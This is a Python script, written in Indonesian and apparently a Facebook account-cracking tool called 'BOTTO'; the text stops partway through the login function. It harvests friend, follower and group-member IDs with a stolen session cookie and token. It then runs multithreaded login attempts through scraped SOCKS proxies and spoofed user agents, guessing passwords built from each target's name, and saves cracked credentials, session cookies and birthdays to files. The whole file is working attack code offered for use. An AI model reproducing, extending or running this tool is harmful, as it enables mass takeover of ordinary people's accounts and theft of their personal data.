#!/usr/bin/python3
# -*- coding: utf-8 -*-

auhtor = 'Arya'
nomer = '+62 877737429**'
info_script = 'BOTTO'

###---[ WARNA ]--###
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING
bb = '\x1b[1;94m' #BIRU
uu = '\x1b[1;95m' #UNGU
###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import time as cs
from time import sleep
import json
import uuid
import hmac
import hashlib
import urllib
import stdiomask
import urllib.request
import calendar
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
USN="Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
menudump=[]
hp = platform.platform()
ses = requests.Session()
s=requests.Session()
try:
	import pyfiglet
except ImportError:
	os.system('pip install pyfiglet')


###---[ LOGO ]---###
def logo(n):
	return str(f"""{P}$$$$$$$\   $$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\  
$$  __$$\ $$  __$$\\__$$  __|\__$$  __|$$  __$$\ 
$$ |  $$ |$$ /  $$ |  $$ |      $$ |   $$ /  $$ |
$$$$$$$\ |$$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$  __$$\ $$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$ |  $$ |$$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$$$$$$  | $$$$$$  |  $$ |      $$ |    $$$$$$  |
\_______/  \______/   \__|      \__|    \______/ 
                                              
  
 Selamat Datang Di Script {M}> {bb}{info_script}  {P}Script masih dalam masa pubertas""")
def logo2():
	return str(f"""{P}$$$$$$$\   $$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\  
$$  __$$\ $$  __$$\\__$$  __|\__$$  __|$$  __$$\ 
$$ |  $$ |$$ /  $$ |  $$ |      $$ |   $$ /  $$ |
$$$$$$$\ |$$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$  __$$\ $$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$ |  $$ |$$ |  $$ |  $$ |      $$ |   $$ |  $$ |
$$$$$$$  | $$$$$$  |  $$ |      $$ |    $$$$$$  |
\_______/  \______/   \__|      \__|    \______/ 
                                              
 
 Selamat Datang Di Script {M}> {bb}{info_script}  {P}Script masih dalam pubertas""")
 

###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
only_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
only_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
graph = 'graph.facebook.com'

###---[ APPEND ]---###
dump, sandi, metode, mbokey = [], [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam, redmi_5a = [], [], []
id, id2, loop ,ok , cp = [], [], 0, 0, 0


###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
	

###---[ GLOBAL KEMBALI ]---###
def kembali():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clear_layar()
	print(logo2())
	print(f'\r\n {M}>{P} sedang dump proxy dan create useragent')
	try:os.remove('.proxy.txt')
	except:pass
	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(uno)
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except requests.exceptions.ConnectionError:
	sys.exit(f" {M}>{P} tidak ada koneksi internet")



for x in range(999):
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	#A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
	#B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
	#C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
	
	A = f'Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2 Build/HUAWEILDN-LX2)'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f' AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.159 Mobile Safari/'
	E = f'537.36 Maxthon/3490'
	F = f'{A}{C}{D}{E}'
	if F in redmi_5a:pass
	else:redmi_5a.append(F)


try:abcde = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f" {M}>{P} gagal dump proxy")
print(f' {bb}>> {P}total new proxy : '+str(len(abcde)))
print(f' {bb}>> {P}total useragent : '+str(len(redmi_5a)))
sleep(1)
	

###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cookie.txt','r').read()
		cookiez = {'cookie':coki}
		tokenz = open('.token.txt','r').read()
		n = ses.get(f'https://{graph}/me?access_token={tokenz}',cookies=cookiez).json()['name'].split(' ')[0].lower()
		menu(n,tokenz,cookiez)
	except Exception as e:login()

#-----[ Time ]-----#
def real_time():
	return str(cs()).split('.')[0]

###---[ LOGIN COOKIE ]---###
def login():
	clear_layar()
	print(logo2())
	cookie = input(f"\n {bb}>{P} Sangan Di Larang Keras Untuk Menggunakan Akun Pribadi\n {bb}>> {P}Masukan Cookie :{hh} ")
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		#ses.post(f"https://{graph}/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		kembali()
	except Exception as e:exit(f" {bb}>{P} cookie invalid silakan cek akun sekarang")



###---[ REMOVE TOKEN & COOKIE ]---###
def remove():
	try:os.remove('.cookie.txt');os.remove('.token.txt')
	except:pass
	
	
	
###---[ MENU UTAMS ]---###
def menu(n,tokenz,cookiez):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {bb}> {P}01 {P}Mau Crack Publik ketik (1)")
	print(f" {bb}> {P}02 {P}Mau Crack Massal ketik (2)")
	print(f" {bb}> {P}03 {P}Mau Crack Follow ketik (3)")
	print(f" {bb}> {P}04 {P}Mau Crack Komen ketik (4)")
	print(f" {bb}> {P}05 {P}Mau Crack Grup ketik (5)")
	print(f" {bb}> {P}06 {P}Mau Cek akun Crack ketik (6)")
	print(f" {bb}> {P}07 {P}Mau Cek Opsi Akun ketik (7)")
	print(f" {bb}> {M}00 {P}Mau Keluar ketik (0/00)")
	ask = input(f'\n {bb}>{P} silahkan ketik :{bb} ')
	if ask in ['1','01']:crack_publik(tokenz,cookiez)
	elif ask in ['2','02']:crack_masal(tokenz,cookiez)
	elif ask in ['3','03']:crack_foll(tokenz,cookiez)
	elif ask in ['4','04']:crack_komen()
	elif ask in ['5','05']:crack_group()
	elif ask in ['6','06']:cek_hasil()
	elif ask in ['7','07']:cek_opsi_cp()
	elif ask in ['0','00']:remove();exit()
	elif ask in ['',' ',]:sys.exit(f" {bb}>{P} Silahkan ketik yang benar")
	else:sys.exit(f" {bb}>{P} Silahkan ketik yang benar")


	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	try:ok = os.listdir('CP')
	except:sys.exit(f"\n {M}>{P} tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f' {bb}> {kk}{no}{P} {x} - {kk}{len(jum)} {P}akun')	
	exc = input(f' {bb}> {P} Masukan nomer yang ingin di cek\n\n {bb}> {P}nomor :{hh} ')
	file = nom[int(exc)-1]
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi_5a)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r {bb}>{P} cek opsi checkpoint telah selesai')
	
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f'\n {bb}> {hh}1{P} cek hasil akun ok\n {bb}> {hh}2{P} cek hasil akun cp\n\n {bb}> {P}Pilih menu (1/2) :{hh} ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f"\n {M}>{P} Hasil ok tidak di temukan")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f' {bb}>> {hh}{no}{P} {x} - {hh}{len(jum)} {P}akun')	
		abc = input(f'\n {bb}>{P} Pilih nomer file :{hh} ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"\n {M}>{P} Hasil ok tidak di temukan")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"\n {bb}>{P} file ok tidak di temukan")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f' {bb}>> {kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')		
		abc = input(f'\n {bb}>{P} Pilih nomer file :{hh} ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f"\n {bb}>{P} file cp tidak di temukan")
		print(kk+buka+P)
	else:sys.exit(f"\n {bb}>{P} silahkan ketik yang benar")

	
###---[ DUMP LOGIN ]---###
def crack_publik(tokenz,cookiez):
	print(' ')
	akun = input(f' {bb}>{P} Pastikan Akun Yang Anda Masukan Publik \n {bb}>> {P}Ketik/Tempel Id :{bb} ')
	print(' ')
	try:
		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={tokenz}',cookies=cookiez).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r %s> %smohon tunggu ,sedang dump %s id'%(bb,P,len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" {M}>>{P} akun tidak publik")	


def crack_masal(tokenz,cookiez):
    print(f'\n {bb}>{P} Pastikan Akun Yang Anda Masukan Publik')
    try:
        bz=0
        apa = int(input(f' {bb}>>{P} jumlah id :{hh} \n'))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r{bb}> {P}masukan akun ke {bz} : ')
    	try:
    		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(name,username,id)&access_token={tokenz}',cookies=cookiez).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r %s> %sMohon sabar ,sedang dump %s id'%(bb,P,len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r {M}>{P} akun tidak publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(tokenz,cookiez):
	akun = input(f'\n {bb}>{P} Pastikan Akun Yang Anda Masukan Publik \n {bb}>> {P}Ketik/Tempel Id :{bb} ')
	try:
		bas = ses.get(f"https://{graph}/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={tokenz}",cookies=cookiez).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r %s> %sMohon sabar ,sedang dump %s id'%(bb,P,len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f"\n {M}>>{P} akun tidak publik")
		
def crack_group():
	link = input(f'\n {bb}>{P} pastikan group yang anda masukan publik \n id/user group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' {M}>>{P} gagal dump group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r {bb}> {P}Mohon sabar ,sedang dump {len(dump)} id ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(' ')
	ro = input(f' {bb}> {P}1{P} mobile ketik (1)\n {bb}> {P}2{P} mbasic ketik (2)\n\n {bb}>{bb}>{P} ketik metode :{bb} ')
	if ro in ['1','01']:metode.append('mobile')
	elif ro in ['2','02']:metode.append('mbasic')
	else:metode.append('mobile')
	chan = input(f'\n {bb}> {P}1{P} akun tertua ketik (1)\n {bb}> {P}2{P} akun ternew ketik (2)\n {bb}> {P}3{P} akun acak/random ketik (3)\n\n {bb}>> {P}ketik urutan :{bb} ')
	if chan in ['1','01']:
		for x in dump:
			id.append(x)
	elif chan in ['2','02']:
		for x in dump:
			id.insert(0,x)
	elif chan in ['3','03']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	cp = input(f'\n {bb}>{P} tampilan opsi sesi ketik (ya/no)\n\n {bb}> {P}pilih  :{bb} ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"\n{P} {bb}>{P} Jika Anda Ingin Menampilkan Aplikasi Bisa Mengakibatkan Akun Terkena checkpoint")
	apk = input(f'\n {bb}>{P} tampilan info aplikasi ketik (ya/no)\n\n {bb}> {P}pilih  :{bb} ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	log = input(f'\n {bb}> {P}1{P} Regular (1)\n {bb}> {P}2{P} Validate no proxy(2)\n\n ketik :{bb} ')
	if log in ['1','01']:regular()
	elif log in ['2','02']:valitade()


###-------[ Regular ]--------]###
def regular():
	cahsip = input(f'\n {bb}> {P}1{P} manual ketik (1)\n {bb}> {P}2{P} gabung ketik (2)\n {bb}> {P}3{P} auto ketik (3)\n\n ketik kombinasi sandi :{bb} ')
	if cahsip in ['1','01']:R_manual()
	elif cahsip in ['2','2']:R_gabung()
	elif cahsip in ['3','03']:R_otomatis()
	else:R_otomatis()

def valitade():
	chan = input(f'\n {bb}> {P}1{P} manual ketik (1)\n {bb}> {P}2{P} gabung ketik (2)\n {bb}> {P}3{P} auto ketik (3)\n\n ketik kombinasi sandi :{bb} ')
	if chan in ['1','01']:V_manual()
	elif chan in ['2','2']:V_gabung()
	elif chan in ['3','03']:V_otomatis()
	else:V_otomatis()
	
from datetime import datetime    	
###-------[ Manual Regular ]--------]###
def R_manual():
	global ok,cp
	pwx = []
	B = input(f'\n {bb}>{P} Input sandi manual max 6 kata\n\n {bb}> {P}sandi anda : ').split(',')
	for x in B:
		pwx.append(x)
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Regular,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Regular,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

###-------[ Manual Validate ]--------]###
def V_manual():
	global ok,cp
	pwx = []
	B = input(f'\n {bb}>{P} Input sandi manual max 6 kata\n\n {bb}> {P}sandi anda : ').split(',')
	for x in B:
		pwx.append(x)
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Validate,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Validate,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

###-------[ Gabungan Regular ]--------]###
def R_gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	B = input(f' {bb}>{P} Input sandi manual max 6 kata\n {bb}> {P}sandi anda : ').split(',')
	C = input(f' {bb}>{P} Input sandi belakang nama max 1 kata\n {bb}> {P}sandi anda : \n')
	if ',' in str(C):
		exit(f" {M}>>{P} sandi belakang {kk}1 {P}kata ")
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Regular,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Regular,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

###-------[ Gabungan Validate ]--------]###
def V_gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	B = input(f' {bb}>{P} Input sandi manual max 6 kata\n {bb}> {P}sandi anda : ').split(',')
	C = input(f' {bb}>{P} Input sandi belakang nama max 1 kata\n {bb}> {P}sandi anda : \n')
	if ',' in str(C):
		exit(f" {M}>>{P} sandi belakang {kk}1 {P}kata ")
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Validate,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Validate,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

				
###-------[ Otomatis Regular ]--------]###
def R_otomatis():
	global ok,cp
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	print(' ')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+"1234")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"124")
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Regular,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Regular,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Regular,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				
###-------[ Otomatis Validate ]--------]###
def V_otomatis():
	global ok,cp
	print(f'\n {bb}> {P}akun ok di simpan ke : {hh}{only_ok}\n {bb}> {P}akun cp di simpan ke :{kk} {only_cp}\n')
	print(' ')
	awal = datetime.now()
	with tred(max_workers=30) as mbokey:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+"1234")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"124")
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				mbokey.submit(Validate,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				mbokey.submit(Validate,idf,pwx,"free.facebook.com",awal)
			else:
				mbokey.submit(Validate,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r {bb}>{P} crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

###---[ MENU CRACK ]---###
resok = []
rescp = []

###-------[ Regular metode ]--------]###
def Regular(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi_5a)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	print(f"\r {bb}>>{P} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			#real_time()
			link = ses.get(f"https://{url}/login/?source=auth_switcher")
			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"email":idf,
			"pass":pw,
			"next":"https://"+url+"/login/save-device/?login_source=login"}
			head = {'accept': '*/*',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'Host': url,
			'origin': 'https://'+url,
			'referer': 'https://'+url+'/login/?source=auth_switcher',
			'user-agent': ua,
			'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
			'sec-ch-ua-mobile': '?0',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'x-requested-with': 'XMLHttpRequest'}
			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=head, data=date, proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							mkz = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=mkz).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+only_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\r {kk}>{P} ID FB  : {kk}{idf}{P}          \n {kk}>{P} sandi  : {kk}{pw}          {P}\n {kk}>{P} User agent : {bb}{ua}\n')
							open('CP/'+only_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+only_ok,'a').write(data+'\n')
					if "coki" in akunok:
						#get_id = ses.get("https://m.facebook.com/profile.php",cookies=kuki,headers=ua).text
						#nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
						#response = ses.get("https://m.facebook.com/profile.php?v=info",cookies=kuki,headers=ua).text
						#try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
						#except:nomer = "tidak di temukan"
						print(f'\r {hh}>{P} ID FB  : {hh}{idf}{P}          \n {hh}>{P} sandi  : {hh}{pw}          {P}\n {hh}>{P} cookie : {hh}{kuki}{P}\n')
						break
					elif "apk" in akunok:
